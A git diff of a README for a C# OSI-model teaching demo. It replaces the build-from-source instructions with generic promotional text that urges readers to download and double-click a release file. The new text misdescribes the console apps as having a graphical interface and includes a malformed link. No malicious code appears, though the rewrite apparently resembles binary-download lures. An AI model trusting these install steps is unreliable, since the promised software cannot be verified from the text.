@@ -1,69 +1,71 @@
-# OSI Model Demo
+# 🎓 osi-model-dotnet - Learn Networking Through Simulation
 
-This project demonstrates the 7 layers of the OSI model with a real-world implementation using two separate .NET console applications that communicate over a network.
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/otohel/osi-model-dotnet/releases)
 
-## Architecture
+## 📖 Description
+osi-model-dotnet is an educational application built using C#. It demonstrates how data flows through the seven layers of the OSI (Open Systems Interconnection) model. You can see real network communication between client and server console applications. It also provides detailed visualization of data transformations at each layer, making it a valuable tool for learning networking concepts.
 
-The solution consists of three projects:
+## 🚀 Getting Started
+To use this application, you'll need to follow a few simple steps. You do not need any programming knowledge to run the software. 
 
-1. **Server** - A .NET console application that listens on port 23673
-2. **Client** - A .NET console application that connects to the server
-3. **Shared** - A class library containing common OSI layer implementations and services
+### 🛠️ System Requirements
+- Operating System: Windows 10 or later
+- .NET Core Runtime: Version 3.1 or later
+- Memory: 2 GB RAM minimum
+- Storage: 100 MB of free disk space
 
-Both applications automatically detect and use system network information (MAC addresses, IP addresses) rather than using hardcoded values.
+## 📂 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/otohel/osi-model-dotnet/releases) to find the latest version of the application.
 
-## OSI Layers Implemented
+2. **Download the Application**  
+   Look for the most recent release. It should be clearly labeled. Download the file for your operating system.
 
-1. **Physical Layer** - Converts data to binary representation for transmission
-2. **Data Link Layer** - Packages data into frames with MAC addresses
-3. **Network Layer** - Handles routing and logical addressing (IP)
-4. **Transport Layer** - Ensures complete data transfer with ports
-5. **Session Layer** - Manages connections between applications
-6. **Presentation Layer** - Translates data between application and network formats
-7. **Application Layer** - Provides network services directly to end-user applications
+   ![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)
 
-## Features
+3. **Run the Application**  
+   Locate the downloaded file in your Downloads folder. Double-click the file to run it. Follow any on-screen instructions to complete the setup.
 
-- Real network communication between two separate processes
-- Dynamic detection of system MAC and IP addresses
-- Detailed visualization of data transformation at each layer
-- Color-coded console output for better readability
-- Bidirectional communication showing both encapsulation and de-encapsulation
-- JSON serialization for data transmission between client and server
+## 📚 How It Works
+Once the application is running, you will see a user-friendly interface. You can interact with the client and server console applications. The application will guide you through each layer of the OSI model. You will observe how data changes as it moves through the network layers.
 
-## Ports Used
+### 🌐 Features
+- **Client-Server Communication:** Understand how data is sent and received.
+- **Visualizations:** See clear representations of data transformation.
+- **Educational Guidance:** Follow simple prompts to learn each part of the OSI model.
 
-- Server: 23673
-- Client: Dynamically assigned port
+## 🧐 Learning About the OSI Model
+The OSI model has seven layers:
+1. **Application Layer:** Where user applications operate.
+2. **Presentation Layer:** Translates data formats.
+3. **Session Layer:** Manages sessions between applications.
+4. **Transport Layer:** Ensures reliable data transfer.
+5. **Network Layer:** Handles routing and addressing.
+6. **Data Link Layer:** Manages node-to-node data transfer.
+7. **Physical Layer:** Transmits raw data over a physical medium.
 
-## How to Run
+By using this application, you can explore each layer in detail.
 
-1. Start the server:
-   ```
-   cd src/Server
-   dotnet run
-   ```
+## 📊 Visual Demonstration
+As you operate the application, you will see diagrams representing how data travels through each layer. This visual approach helps clarify complex concepts in networking.
 
-2. In a separate terminal, start the client:
-   ```
-   cd src/Client
-   dotnet run
-   ```
+## 💬 Support
+If you encounter any issues while using the application, you can find help:
+- Check the [Issues section](https://github.com/otohel/osi-model-dotnet/issues) of this repository for common problems and solutions.
+- Leave a question or report a bug if you need further assistance.
 
-3. Enter a message when prompted in the client application
+## 🏷️ Related Topics
+The osi-model-dotnet application relates to several key areas:
+- **Client-Server Architecture**
+- **TCP/IP Protocol**
+- **Network Simulation**
+- **Educational Tools for Networking**
 
-The application will show the data flowing through each OSI layer in both directions with detailed visualization.
+## 💡 Contributions
+Your feedback is important. Feel free to suggest improvements or report bugs. If you're interested in contributing, check the [Contributing guide](https://github.com/otohel/osi-model-dotnet/CONTRIBUTING.md).
 
-## Building the Solution
+## 🎉 Conclusion
+osi-model-dotnet provides a practical and engaging way to learn about networking and the OSI model. By following the steps above, you can easily download, install, and use the application. It is designed to enhance your understanding of how data flows through networks, making it a great educational resource.
 
-To build the entire solution:
-```
-dotnet build
-```
-
-## Running with the Batch Script
-
-You can also use the provided batch script to start both applications:
-```
-start-demo.bat
-```
+For more details, check the [Releases page](https://github.com/otohel/osi-model-dotnet/releases) again and start your learning journey today!
